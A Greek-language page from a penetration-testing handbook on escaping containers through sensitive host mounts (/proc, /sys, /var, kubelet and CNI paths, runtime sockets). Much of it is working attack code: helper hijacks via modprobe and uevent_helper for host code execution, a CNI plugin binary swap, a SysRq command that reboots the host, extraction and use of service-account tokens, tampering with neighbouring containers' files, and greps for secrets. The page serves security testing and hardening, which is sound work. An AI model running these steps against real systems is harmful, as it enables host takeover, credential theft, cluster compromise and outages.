# Ευαίσθητα Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Host mounts είναι μία από τις σημαντικότερες πρακτικές επιφάνειες για container-escape, επειδή συχνά καταργούν την προσεκτικά απομονωμένη προβολή διεργασιών, επαναφέροντας την άμεση ορατότητα των host resources. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Τα bind mounts των `/proc`, `/sys`, `/var`, των runtime sockets, της κατάστασης που διαχειρίζεται το kubelet ή paths που σχετίζονται με devices μπορούν να εκθέσουν kernel controls, credentials, filesystems γειτονικών containers και runtime management interfaces.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας, επειδή το abuse model είναι cross-cutting. Ένα writable host mount είναι επικίνδυνο εν μέρει εξαιτίας των mount namespaces, εν μέρει εξαιτίας των user namespaces, εν μέρει εξαιτίας της κάλυψης από AppArmor ή SELinux και εν μέρει εξαιτίας του ακριβούς host path που εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστού θέματος κάνει την attack surface πολύ ευκολότερη στην κατανόηση.

## Έκθεση του `/proc`

Το procfs περιέχει τόσο συνηθισμένες πληροφορίες διεργασιών όσο και kernel control interfaces υψηλού αντίκτυπου. Επομένως, ένα bind mount όπως το `-v /proc:/host/proc` ή μια container view που εκθέτει μη αναμενόμενα writable proc entries μπορεί να οδηγήσει σε information disclosure, denial of service ή άμεση εκτέλεση κώδικα στο host.

Σημαντικά procfs paths περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Ξεκινήστε ελέγχοντας ποια procfs entries υψηλής αξίας είναι ορατά ή writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτές οι διαδρομές είναι ενδιαφέρουσες για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να μετατραπούν σε paths για host code execution όταν είναι εγγράψιμα. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` αποτελούν ισχυρές πηγές reconnaissance για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν context διεργασιών, cgroup και filesystem, το οποίο μπορεί να βοηθήσει στην ανακατασκευή της διάταξης του host από το εσωτερικό του container.

Η πρακτική αξία κάθε path διαφέρει και η αντιμετώπισή τους σαν να είχαν όλα το ίδιο impact δυσκολεύει το triage:

- `/proc/sys/kernel/core_pattern`
Αν είναι εγγράψιμο, είναι ένα από τα procfs paths με το υψηλότερο impact, επειδή ο kernel εκτελεί έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει host code execution. Δείτε επίσης το [read-only-paths.md](protections/read-only-paths.md) για ένα dedicated example.
- `/proc/sys/kernel/modprobe`
Αυτό το path ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει τη λογική φόρτωσης modules. Αν είναι εγγράψιμο από το container και ερμηνεύεται στο host context, μπορεί να μετατραπεί σε ένα ακόμη host code-execution primitive. Είναι ιδιαίτερα ενδιαφέρον όταν συνδυάζεται με έναν τρόπο trigger του helper path.
- `/proc/sys/vm/panic_on_oom`
Αυτό συνήθως δεν αποτελεί clean escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε host-wide denial of service, μετατρέποντας τις συνθήκες OOM σε συμπεριφορά kernel panic.
- `/proc/sys/fs/binfmt_misc`
Αν το registration interface είναι εγγράψιμο, ο attacker μπορεί να καταχωρίσει έναν handler για μια επιλεγμένη magic value και να αποκτήσει host-context execution όταν εκτελείται ένα matching file.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά στον προσδιορισμό των subsystems, mitigations και optional kernel features που είναι ενεργοποιημένα, χωρίς να απαιτούνται host package metadata.
- `/proc/sysrq-trigger`
Κυρίως path για denial of service, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic ή να διαταράξει με άλλον τρόπο άμεσα τον host.
- `/proc/kmsg`
Αποκαλύπτει μηνύματα από το kernel ring buffer. Είναι χρήσιμο για host fingerprinting, crash analysis και, σε ορισμένα environments, για leaking πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
Είναι πολύτιμο όταν είναι readable, επειδή αποκαλύπτει πληροφορίες για exported kernel symbols και μπορεί να βοηθήσει στην παράκαμψη assumptions σχετικά με το address randomization κατά την ανάπτυξη kernel exploits.
- `/proc/[pid]/mem`
Αυτό αποτελεί direct process-memory interface. Αν η target process είναι προσβάσιμη με τις απαραίτητες ptrace-style conditions, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης άλλης process. Το πραγματικό impact εξαρτάται σε μεγάλο βαθμό από τα credentials, τα `hidepid`, το Yama και τους ptrace restrictions, επομένως είναι ένα ισχυρό αλλά conditional path.
- `/proc/kcore`
Εκθέτει μια core-image-style άποψη της system memory. Το file είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά readable, υποδεικνύει μια host memory surface που έχει εκτεθεί σοβαρά.
- `/proc/kmem` και `/proc/mem`
Ιστορικά αποτελούν high-impact raw memory interfaces. Σε πολλά σύγχρονα systems είναι disabled ή heavily restricted, αλλά αν υπάρχουν και είναι usable, πρέπει να αντιμετωπίζονται ως critical findings.
- `/proc/sched_debug`
Κάνει leak πληροφοριών scheduling και tasks, οι οποίες μπορεί να αποκαλύψουν identities host processes, ακόμη και όταν άλλες process views φαίνονται καθαρότερες από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Είναι εξαιρετικά χρήσιμο για την ανακατασκευή του πού βρίσκεται πραγματικά το container στον host, ποια paths βασίζονται σε overlay και αν ένα writable mount αντιστοιχεί σε host content ή μόνο στο container layer.

Αν τα `/proc/[pid]/mountinfo` ή οι λεπτομέρειες του overlay είναι readable, χρησιμοποιήστε τα για να ανακτήσετε το host path του container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν τη μετατροπή μιας διαδρομής μέσα στο container στην αντίστοιχη διαδρομή από την οπτική του host.

### Πλήρες παράδειγμα: Κατάχρηση διαδρομής βοηθητικού `modprobe`

Αν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και η διαδρομή του helper ερμηνεύεται στο context του host, μπορεί να ανακατευθυνθεί σε payload που ελέγχεται από τον attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Η ακριβής ενεργοποίηση εξαρτάται από τον στόχο και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι μια εγγράψιμη διαδρομή helper μπορεί να ανακατευθύνει μια μελλοντική επίκληση helper από τον kernel σε περιεχόμενο host-path που ελέγχεται από τον attacker.

### Πλήρες Παράδειγμα: Kernel Recon Με `kallsyms`, `kmsg` Και `config.gz`

Αν ο στόχος είναι η αξιολόγηση exploitability και όχι η άμεση διαφυγή:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν τα πρόσφατα μηνύματα του kernel αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες δυνατότητες ή mitigations του kernel έχουν ενσωματωθεί κατά το compile. Ο αντίκτυπος συνήθως δεν είναι άμεσο escape, αλλά μπορεί να συντομεύσει σημαντικά το triage ευπαθειών του kernel.

### Πλήρες Παράδειγμα: Επανεκκίνηση Host με SysRq

Αν το `/proc/sysrq-trigger` είναι εγγράψιμο και παρέχει πρόσβαση στην προβολή του host:
```bash
echo b > /proc/sysrq-trigger
```
Η επίδραση είναι άμεση επανεκκίνηση του host. Δεν πρόκειται για διακριτικό παράδειγμα, αλλά καταδεικνύει ξεκάθαρα ότι η έκθεση του procfs μπορεί να είναι πολύ σοβαρότερη από την απλή αποκάλυψη πληροφοριών.

## Έκθεση του `/sys`

Το sysfs εκθέτει μεγάλες ποσότητες κατάστασης του kernel και των συσκευών. Ορισμένα μονοπάτια του sysfs είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση helper, τη συμπεριφορά συσκευών, τη ρύθμιση των security modules ή την κατάσταση του firmware.

Σημαντικά μονοπάτια του sysfs περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα μονοπάτια είναι σημαντικά για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά της διαχείρισης θερμοκρασίας και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με κακή έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να κάνει leak πληροφορίες σχετικά με crash dumps και τη διάταξη του kernel, οι οποίες βοηθούν σε low-level fingerprinting του host. Το `/sys/kernel/security` είναι το interface του `securityfs` που χρησιμοποιείται από τα Linux Security Modules, επομένως η μη αναμενόμενη πρόσβαση εκεί μπορεί να εκθέσει ή να τροποποιήσει κατάσταση που σχετίζεται με MAC. Τα μονοπάτια των EFI variables μπορούν να επηρεάσουν ρυθμίσεις εκκίνησης που υποστηρίζονται από το firmware, καθιστώντας τα πολύ πιο σοβαρά από τα συνηθισμένα configuration files. Το `debugfs` στο `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο, επειδή αποτελεί σκόπιμα developer-oriented interface με πολύ λιγότερες προσδοκίες ασφάλειας σε σχέση με τα hardened kernel APIs που προορίζονται για production.

Χρήσιμες εντολές ελέγχου για αυτά τα μονοπάτια είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι κάνει αυτές τις εντολές ενδιαφέρουσες:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποια άλλη επιφάνεια LSM είναι ορατή με τρόπο που θα έπρεπε να παραμένει διαθέσιμος μόνο στο host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και διαθέσιμο για ανάγνωση ή εγγραφή, αναμένετε μια ευρεία επιφάνεια που αλληλεπιδρά με τον kernel, της οποίας ο ακριβής κίνδυνος εξαρτάται από τα ενεργοποιημένα debug nodes.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συνηθισμένη, αλλά έχει υψηλό impact όταν υπάρχει, επειδή αφορά ρυθμίσεις που υποστηρίζονται από το firmware και όχι συνηθισμένα αρχεία runtime.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το hardware, όχι ένα neat shell-style escape.
- Το `/sys/kernel/vmcoreinfo` αποτελεί κυρίως πηγή host-fingerprinting και crash-analysis, χρήσιμη για την κατανόηση της κατάστασης του kernel σε χαμηλό επίπεδο.

### Full Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να εκτελέσει έναν helper ελεγχόμενο από τον attacker όταν ενεργοποιηθεί ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος για τον οποίο αυτό λειτουργεί είναι ότι το path του helper ερμηνεύεται από την οπτική γωνία του host. Μόλις ενεργοποιηθεί, ο helper εκτελείται στο context του host και όχι μέσα στο τρέχον container.

## `/var` Exposure

Η προσάρτηση του `/var` του host σε ένα container συχνά υποτιμάται, επειδή δεν φαίνεται τόσο δραματική όσο η προσάρτηση του `/`. Στην πράξη, μπορεί να αρκεί για την πρόσβαση σε runtime sockets, καταλόγους snapshot των containers, volumes των pods που διαχειρίζεται το kubelet, projected tokens λογαριασμών υπηρεσίας και filesystems γειτονικών εφαρμογών. Σε σύγχρονους nodes, το `/var` είναι συχνά το σημείο όπου βρίσκεται πραγματικά το πιο ενδιαφέρον από επιχειρησιακής άποψης state των containers.

### Kubernetes Example

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει τα projected tokens άλλων pods και το περιεχόμενο των overlay snapshots:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν στο αν το mount εκθέτει μόνο ασήμαντα δεδομένα εφαρμογής ή credentials cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί να μετατρέψει άμεσα την τοπική εκτέλεση κώδικα σε πρόσβαση στο Kubernetes API.

Αν υπάρχει το token, επικυρώστε σε τι μπορεί να αποκτήσει πρόσβαση αντί να σταματήσετε στην ανακάλυψη του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση σε έναν τοπικό node. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα mounted `/var` σε compromise ολόκληρου του cluster.

### Παράδειγμα Docker και containerd

Σε hosts με Docker, τα σχετικά δεδομένα βρίσκονται συχνά κάτω από το `/var/lib/docker`, ενώ σε Kubernetes nodes που βασίζονται στο containerd μπορεί να βρίσκονται κάτω από το `/var/lib/containerd` ή σε paths ειδικά για τον snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Αν το mounted `/var` εκθέτει εγγράψιμα περιεχόμενα snapshot ενός άλλου workload, ο attacker ενδέχεται να μπορεί να τροποποιήσει αρχεία εφαρμογών, να τοποθετήσει web content ή να αλλάξει startup scripts χωρίς να αγγίξει την τρέχουσα διαμόρφωση του container.

Συγκεκριμένες ιδέες abuse όταν εντοπιστούν εγγράψιμα περιεχόμενα snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων των mounted `/var`: παραποίηση εφαρμογών, ανάκτηση secrets και lateral movement σε γειτονικά workloads.

## Kubelet State, Plugins And CNI Paths

Ένα mount των `/var/lib/kubelet`, `/opt/cni/bin` ή `/etc/cni/net.d` εκτίθεται συχνά μέσω privileged DaemonSets, CNI agents, CSI node plugins, GPU operators και storage helpers. Αυτά τα mounts είναι εύκολο να θεωρηθούν απλώς "node plumbing", αλλά βρίσκονται απευθείας στη διαδρομή εκτέλεσης για νέα pods και συχνά περιέχουν kubelet credentials, projected secrets, registration sockets και executable host-side plugin binaries.

Οι στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές review είναι:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Γιατί έχουν σημασία αυτά τα paths:

- Το `/var/lib/kubelet/pki` ενδέχεται να εκθέτει client certificates του kubelet και άλλα node-local credentials, τα οποία μερικές φορές μπορούν να επαναχρησιμοποιηθούν απέναντι στο API server ή σε kubelet-facing TLS endpoints, ανάλογα με τον σχεδιασμό του cluster.<sup>[[1]](#references)</sup>
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και mounted Secrets για neighboring pods στο ίδιο node.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` αποτελεί κυρίως επιφάνεια reconnaissance, αλλά είναι ιδιαίτερα χρήσιμη: αποκαλύπτει ποια pods και containers έχουν επί του παρόντος στην κατοχή τους GPUs, hugepages, SR-IOV devices και άλλους scarce node-local resources.<sup>[[1]](#references)</sup>
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και με ποια sockets αναμένεται να επικοινωνεί το kubelet. Αν αυτοί οι κατάλογοι είναι writable και όχι απλώς readable, το εύρημα γίνεται πολύ σοβαρότερο.<sup>[[1]](#references)</sup>
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στη διαδρομή setup του pod-network. Η writable πρόσβαση εκεί αποτελεί συχνά delayed host-execution primitive και όχι απλώς έκθεση configuration.<sup>[[2]](#references)</sup>

### Πλήρες Example: Writable `/opt/cni/bin`

Αν ένας host CNI binary directory γίνει mounted read-write, η αντικατάσταση ενός plugin μπορεί να αρκεί για την απόκτηση host execution την επόμενη φορά που το kubelet δημιουργεί ένα pod sandbox σε αυτό το node:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά είναι συχνά πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Το σημαντικό σημείο είναι ότι το modified binary εκτελείται αργότερα από τη ροή ρύθμισης του host network και όχι από το τρέχον container.

## Runtime Sockets

Τα ευαίσθητα host mounts συχνά περιλαμβάνουν runtime sockets αντί για ολόκληρους καταλόγους. Είναι τόσο σημαντικά, ώστε αξίζει να επαναληφθούν ρητά εδώ:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές exploitation μόλις γίνει mount ένα από αυτά τα sockets.

Ως ένα γρήγορο αρχικό μοτίβο αλληλεπίδρασης:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Αν κάποιο από αυτά πετύχει, η διαδρομή από το "mounted socket" έως το "start a more privileged sibling container" είναι συνήθως πολύ συντομότερη από οποιαδήποτε kernel breakout διαδρομή.

## Writable Host Path Task Hijack

Ένα writable host mount δεν χρειάζεται να εκθέτει το `/` για να είναι επικίνδυνο. Αν το mounted path περιέχει scripts, αρχεία config, hooks, plugins ή αρχεία που καταναλώνονται αργότερα από ένα host-side scheduled task ή service, το container μπορεί να είναι σε θέση να αλλάξει αυτό που εκτελεί το host.

Γενική ροή ελέγχου:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Αν ένα αρχείο με δυνατότητα εγγραφής χρησιμοποιείται από μια διεργασία του host, διατηρήστε το payload απλό και παρατηρήσιμο κατά τη διάρκεια των δοκιμών:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Το ενδιαφέρον σημείο είναι το trust boundary: η εγγραφή πραγματοποιείται από το εσωτερικό του container, αλλά η εκτέλεση γίνεται αργότερα στο context της υπηρεσίας του host. Αυτό μετατρέπει ένα περιορισμένο hostPath ή bind mount σε delayed host-code-execution primitive.

## CVEs που σχετίζονται με mounts

Τα host mounts σχετίζονται επίσης με vulnerabilities του runtime. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- Το `CVE-2024-21626` στο `runc`, όπου ένα leaked directory file descriptor μπορούσε να τοποθετήσει το working directory στο filesystem του host.
- Τα `CVE-2024-23651`, `CVE-2024-23652` και `CVE-2024-23653` στο BuildKit, όπου κακόβουλα Dockerfiles, frontends και ροές `RUN --mount` μπορούσαν να επαναφέρουν πρόσβαση σε αρχεία του host, διαγραφή ή elevated privileges κατά τη διάρκεια των builds.
- Το `CVE-2024-1753 στα Buildah και Podman build flows, όπου crafted bind mounts κατά τη διάρκεια του build μπορούσαν να εκθέσουν το `/` με read-write πρόσβαση.
- Το `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά το image unpack μπορούσε να επιτρέψει σε ένα specially crafted image να τροποποιήσει το filesystem του host κατά το pull.

Αυτά τα CVEs είναι σημαντικά εδώ, επειδή δείχνουν ότι το mount handling δεν αφορά μόνο τη ρύθμιση από τον operator. Το runtime μπορεί επίσης να εισαγάγει συνθήκες escape που βασίζονται σε mounts.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις σημαντικότερες εκθέσεις mounts:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Τι είναι ενδιαφέρον εδώ:

- Τα Host root, `/proc`, `/sys`, `/var` και τα runtime sockets αποτελούν ευρήματα υψηλής προτεραιότητας.
- Τα writable entries στο proc/sys συχνά σημαίνουν ότι το mount εκθέτει host-global kernel controls αντί για ένα ασφαλές container view.
- Τα mounted paths στο `/var` απαιτούν έλεγχο για credentials και neighboring workloads, όχι μόνο έλεγχο του filesystem.
- Τα Kubelet state directories και τα CNI/plugin paths απαιτούν την ίδια προτεραιότητα με τα runtime sockets, επειδή συχνά βρίσκονται απευθείας στη διαδρομή του node για τη δημιουργία pods και τη διανομή credentials.

## Αναφορές

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Το cilium-agent container μπορεί να αποκτήσει πρόσβαση στο host μέσω mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
